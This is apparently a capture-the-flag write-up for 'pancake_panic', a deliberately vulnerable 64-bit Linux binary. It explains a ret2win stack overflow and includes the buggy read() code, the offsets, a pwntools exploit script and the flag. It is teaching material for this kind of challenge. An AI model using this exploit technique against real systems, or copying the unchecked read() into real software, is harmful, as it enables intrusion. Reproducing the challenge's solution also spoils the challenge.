# PANCAKE PANIC Solution

## Challenge Summary

`pancake_panic` is a 64-bit Linux stack overflow challenge with an intro-level
ret2win solution.

The bug is in `take_order()`:

- it allocates a 64-byte stack buffer
- it leaks the buffer address
- it calls `read(STDIN_FILENO, buf, 256)`

That `read()` lets us overwrite saved `RBP` and then saved `RIP`.

The intended target is the hidden `serve_flag()` function, which opens
`flag.txt`, prints it, flushes output, and exits cleanly with `_exit(0)`.

## Protections

From the build flags and compiled binary:

- Canary: off
- PIE: off
- NX: stack marked executable, though the current solve does not need it
- ASLR: on at the system level

Because PIE is disabled, code addresses inside the binary are fixed. The stack
leak is therefore not required for the final ret2win exploit, but it is still
present in the program output.

## Vulnerability Analysis

The key function is:

```c
static void take_order(void)
{
    char buf[64];

    printf("    [Chef] Your plate is ready at address : %p\n", (void *)buf);
    printf("    [>] How many pancakes would you like? ");
    fflush(stdout);

    read(STDIN_FILENO, buf, 256);
}
```

### Stack Layout

`take_order()` has the standard frame:

```text
HIGHER ADDRESS
+-----------------------------+
| saved RIP                   |  <- offset 72 from buf[0]
+-----------------------------+
| saved RBP                   |  <- offset 64 from buf[0]
+-----------------------------+
| char buf[64]                |
+-----------------------------+
LOWER ADDRESS
```

So the overwrite distance to the saved return address is:

```text
64 bytes (buf) + 8 bytes (saved RBP) = 72 bytes
```

## Finding the Win Function

The hidden flag-printing function is `serve_flag()`.

You can recover it with:

```sh
nm -n pancake_panic | grep serve_flag
```

On the current build:

```text
00000000004012c2 t serve_flag
```

So:

- `serve_flag()` = `0x4012c2`

The solver also inserts a single `ret` gadget before `serve_flag()`:

```text
0x40101a
```

This is a common amd64 stack-alignment fix. In practice, many simple ret2win
chains work more reliably with an extra `ret` before entering the target
function.

## Exploit Strategy

The exploit is:

1. Send 72 bytes of padding to reach saved `RIP`.
2. Write the address of a `ret` gadget.
3. Write the address of `serve_flag()`.
4. Let the function return.

When `take_order()` executes `leave; ret`, control flows into:

```text
ret -> serve_flag()
```

Then `serve_flag()` prints the flag and exits with `_exit(0)`, which avoids any
need to restore the corrupted stack.

## Final Payload Layout

```text
[ "A" * 72 ][ ret ][ serve_flag ]
```

In pwntools:

```python
payload = flat(
    b"A" * 72,
    0x40101a,
    0x4012c2,
)
```

## Solver Walkthrough

The provided `solve.py` does exactly that:

```python
RIP_OFFSET = 72
WIN = elf.symbols["serve_flag"]
RET = rop.find_gadget(["ret"]).address

payload = flat(
    b"A" * RIP_OFFSET,
    RET,
    WIN,
)
```

### Why the Stack Leak Is Still Parsed

`solve.py` still reads the printed stack address:

```python
p.recvuntil(b"address : ")
leak = p.recvline().strip()
```

This is mostly informational in the ret2win version. It confirms the program
state and keeps the exploit synchronized with the remote prompt.

## Local Solve

Build and run:

```sh
make pancake_panic
python3 solve.py
```

Expected result:

```text
[Chef] Reginald drops the forbidden menu behind the counter:
GRIZZ{n0p_sl3d_to_p4nc4k3_p4r4d123}
```

## Remote Solve

The configured challenge port is `7331`.

Example:

```sh
python3 solve.py REMOTE <host> 7331
```

## Manual Exploit Script

Minimal standalone exploit:

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./pancake_panic", checksec=False)
rop = ROP(elf)

p = process("./pancake_panic")

p.recvuntil(b"address : ")
p.recvline()
p.recvuntil(b"[>]")

payload = flat(
    b"A" * 72,
    rop.find_gadget(["ret"]).address,
    elf.symbols["serve_flag"],
)

p.send(payload)
print(p.recvall().decode())
```

## Why This Version Is Stable

The earlier shellcode-style approach depended on executable-stack behavior and
environment-specific details. This version is more robust because:

- it does not depend on injected shellcode running
- it does not need a writable/executable landing area
- it uses fixed code addresses from a non-PIE binary
- the target function exits directly after printing the flag

That makes the challenge much more consistent across local runs, Docker, and
remote deployment.

## Key Takeaways

- The bug is a classic stack overflow via oversized `read()`.
- The control offset is `72`.
- The intended target is `serve_flag()`.
- The exploit is a simple amd64 ret2win chain.

